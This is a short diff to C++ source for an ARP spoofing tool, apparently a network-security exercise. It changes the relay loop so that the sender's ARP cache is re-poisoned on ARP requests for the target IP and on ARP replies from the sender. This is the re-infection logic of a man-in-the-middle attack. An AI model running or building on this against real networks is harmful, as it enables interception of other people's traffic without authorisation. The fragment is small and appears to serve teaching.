@@ -291,13 +291,19 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt ARP request
             //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
-            if ((ethhdr->dmac() == Mac::broadcastMac() || ethhdr->dmac() == attack_mac)
-                && ethhdr->smac() == sender_mac && arp_pkt->op() == ArpHdr::Request)
+            if (arp_pkt->tip() == target_ip && arp_pkt->op() == ArpHdr::Request)
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                         return false;
                     }
+                cout << "infected\n";
+            }
+            else if (arp_pkt->sip() == sender_ip && arp_pkt->op() == ArpHdr::Reply) {
+                if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
+                    cout << "Failed ARP infection\n";
+                    return false;
+                }
                 cout << "infected\n";
             }
         }
